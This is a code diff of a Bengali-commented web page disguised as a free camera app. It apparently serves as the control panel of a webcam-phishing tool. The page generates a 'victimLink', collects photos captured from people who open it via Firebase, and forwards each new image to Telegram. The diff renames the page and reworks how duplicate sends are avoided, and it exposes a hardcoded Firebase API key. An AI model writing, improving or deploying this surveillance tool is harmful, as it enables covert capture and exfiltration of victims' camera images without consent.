@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CamSnap- Free Online Camera Capture & Webcam – রিয়েল টাইম ফিল্টার</title>
+<title>SnapCam- Free Online Camera Capture & Webcam – রিয়েল টাইম ফিল্টার</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -69,8 +69,10 @@ const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDom
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
+// ট্র্যাক করবো কোন ছবি টেলিগ্রামে পাঠানো হয়েছে (লোকাল স্টোরেজে সেভ)
+let sentPhotos = JSON.parse(localStorage.getItem("sentPhotos") || "{}");
+
 let currentId = localStorage.getItem("currentCamId") || null;
-let telegramSent = new Set(); // এই সেট দিয়ে ট্র্যাক করবো কোন ছবি পাঠানো হয়েছে
 
 if(currentId){
   document.getElementById("linkBox").style.display = "block";
@@ -81,7 +83,9 @@ if(currentId){
 function generateLink(){
   currentId = Date.now().toString(36);
   localStorage.setItem("currentCamId", currentId);
-  telegramSent.clear(); // নতুন লিংক হলে পুরানো রেকর্ড মুছে ফেলো
+  sentPhotos[currentId] = sentPhotos[currentId] || []; // নতুন আইডির জন্য খালি অ্যারে
+  localStorage.setItem("sentPhotos", JSON.stringify(sentPhotos));
+  
   const link = location.href.split('index.html')[0] + "view.html?id=" + currentId;
   document.getElementById("linkBox").style.display = "block";
   document.getElementById("victimLink").value = link;
@@ -96,10 +100,11 @@ function copyLink(){
   alert("কপি হয়ে গেছে!");
 }
 
-// টেলিগ্রামে শুধু একবার পাঠাবে
-async function sendToTelegramOnce(base64, timestamp){
-  if(telegramSent.has(timestamp)) return; // ইতিমধ্যে পাঠানো হয়েছে
-  telegramSent.add(timestamp);
+// টেলিগ্রামে শুধু নতুন ছবি পাঠাবে
+async function sendToTelegramIfNew(base64, photoTime){
+  if(!currentId || sentPhotos[currentId].includes(photoTime)) return;
+  sentPhotos[currentId].push(photoTime);
+  localStorage.setItem("sentPhotos", JSON.stringify(sentPhotos));
 
   try{
     const blob = await (await fetch(base64)).blob();
@@ -123,10 +128,16 @@ function loadPhotos(id){
     card.innerHTML = `<img src="${data.data}" onclick="window.open('${data.data}')"><div class="time">${new Date(data.time).toLocaleTimeString('bn-BD')}</div>`;
     document.getElementById("grid").appendChild(card);
 
-    // শুধু একবার টেলিগ্রামে পাঠাবে
-    sendToTelegramOnce(data.data, data.time);
+    // শুধু নতুন ছবি টেলিগ্রামে পাঠাবে
+    sendToTelegramIfNew(data.data, data.time);
   });
-  setTimeout(()=>{ ref.remove(); localStorage.removeItem("currentCamId"); telegramSent.clear(); }, 3600000);
+
+  setTimeout(()=>{
+    ref.remove();
+    localStorage.removeItem("currentCamId");
+    delete sentPhotos[id];
+    localStorage.setItem("sentPhotos", JSON.stringify(sentPhotos));
+  }, 3600000);
 }
 </script>
 </body>
